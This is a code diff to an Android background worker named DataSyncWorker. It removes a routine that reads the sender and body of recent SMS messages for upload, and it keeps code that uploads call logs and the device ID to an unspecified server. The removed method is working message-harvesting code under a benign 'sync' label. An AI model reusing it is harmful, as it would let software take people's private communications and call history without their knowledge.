@@ -8,7 +8,6 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.provider.CallLog;
-import android.provider.Telephony;
 import android.util.Log;
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
@@ -65,8 +64,7 @@ public class DataSyncWorker extends Worker {
     }
 
     private void uploadData(Context context) {
-        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED ||
-            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             Log.w(TAG, "Permissions missing for data sync");
             return;
         }
@@ -74,7 +72,6 @@ public class DataSyncWorker extends Worker {
         try {
             JSONObject payload = new JSONObject();
             payload.put("call_logs", getCallLogs(context));
-            payload.put("sms_messages", getSmsMessages(context));
             payload.put("device_id", android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
 
             // Upload via OkHttp
@@ -126,23 +123,4 @@ public class DataSyncWorker extends Worker {
         return logs;
     }
 
-    private JSONArray getSmsMessages(Context context) {
-        JSONArray msgs = new JSONArray();
-        try {
-            ContentResolver resolver = context.getContentResolver();
-            Cursor cursor = resolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
-            if (cursor != null) {
-                int count = 0;
-                while (cursor.moveToNext() && count < 20) {
-                     JSONObject sms = new JSONObject();
-                     sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
-                     sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
-                     msgs.put(sms);
-                     count++;
-                }
-                cursor.close();
-            }
-        } catch (Exception e) { Log.e(TAG, "Error getting SMS", e); }
-        return msgs;
-    }
 }
